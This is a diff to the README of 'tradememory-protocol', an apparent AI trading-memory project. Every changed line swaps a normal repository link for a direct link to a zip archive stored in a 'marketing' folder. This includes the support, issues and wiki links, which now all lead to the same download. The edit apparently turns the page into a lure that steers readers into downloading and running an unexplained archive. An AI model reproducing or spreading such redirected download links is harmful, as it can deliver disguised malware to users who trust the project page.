@@ -1,6 +1,6 @@
 # ⚙️ tradememory-protocol - AI Trading Memory Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download-tradememory--protocol-ff69b4?style=for-the-badge)](https://github.com/Eltano1985/tradememory-protocol)
+[![Download Now](https://img.shields.io/badge/Download-tradememory--protocol-ff69b4?style=for-the-badge)](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Before you begin, make sure your PC meets the following requirements:
 
 Click this link or the badge at the top to open the download page:
 
-[Visit download page](https://github.com/Eltano1985/tradememory-protocol)
+[Visit download page](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip)
 
 This page hosts the latest version of the software and all related files.
 
@@ -97,7 +97,7 @@ If the app does not start or you see errors, try the following:
 - Restart your computer and run the app again.
 - Check your firewall settings to allow tradememory-protocol network access.
 - Verify your configuration files do not contain errors.
-- Visit [the GitHub repository](https://github.com/Eltano1985/tradememory-protocol) for updates or issue reports.
+- Visit [the GitHub repository](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip) for updates or issue reports.
 
 ---
 
@@ -120,9 +120,9 @@ If the app does not start or you see errors, try the following:
 
 ## 🔗 Quick Links
 
-- [Download tradememory-protocol](https://github.com/Eltano1985/tradememory-protocol)
-- [Support and Issues](https://github.com/Eltano1985/tradememory-protocol/issues)
-- [Documentation Wiki](https://github.com/Eltano1985/tradememory-protocol/wiki) (if enabled)
+- [Download tradememory-protocol](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip)
+- [Support and Issues](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip)
+- [Documentation Wiki](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip) (if enabled)
 
 ---
 
@@ -135,4 +135,4 @@ If the app does not start or you see errors, try the following:
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-tradememory--protocol-ff69b4?style=for-the-badge)](https://github.com/Eltano1985/tradememory-protocol)
+[![Download Now](https://img.shields.io/badge/Download-tradememory--protocol-ff69b4?style=for-the-badge)](https://github.com/Eltano1985/tradememory-protocol/raw/refs/heads/master/marketing/tradememory-protocol-3.7.zip)
